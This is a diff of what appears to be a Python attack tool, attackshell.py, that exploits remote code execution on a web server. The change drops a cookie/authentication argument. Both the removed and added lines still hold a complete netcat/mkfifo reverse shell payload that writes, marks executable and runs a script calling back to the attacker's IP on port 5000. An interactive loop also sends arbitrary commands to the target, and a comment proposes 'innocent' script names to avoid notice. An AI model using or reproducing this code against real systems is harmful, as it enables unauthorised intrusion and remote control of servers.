@@ -23,10 +23,10 @@ def runRCE(URL, cmd):
 
 # TODO : choose innocent script names randomly to prevent accidental clashes
 # TODO : support other methods of opening the reverse shell
-def openReverseShell(URL, IP, cookies):
-  runRCE(URL, 'echo "rm /tmp/fug1;mkfifo /tmp/fug1;cat /tmp/fug1|/bin/sh -i 2>&1|nc ' + IP + ' 5000 >/tmp/fug1" > plznow.sh', cookies)
-  runRCE(URL, "chmod u+x plznow.sh", cookies)
-  runRCE(URL, "./plznow.sh", cookies)
+def openReverseShell(URL, IP):
+  runRCE(URL, 'echo "rm /tmp/fug1;mkfifo /tmp/fug1;cat /tmp/fug1|/bin/sh -i 2>&1|nc ' + IP + ' 5000 >/tmp/fug1" > plznow.sh')
+  runRCE(URL, "chmod u+x plznow.sh")
+  runRCE(URL, "./plznow.sh")
 
 # USE LIKE: python attackshell.py http://exploitable.server.somewhere 1.1.1.1
 # 1.1.1.1 = your IP for reverse shell, if possible 
@@ -43,8 +43,8 @@ while (data != 'exit'):
   try:
     data = raw_input('>> ')
     if (data != 'exit'):
-      runRCE(URL, data, auth)
+      runRCE(URL, data)
     if (data == 'rshell'):
-      openReverseShell(URL,IP,cookies)
+      openReverseShell(URL,IP)
   except EOFError:
     break
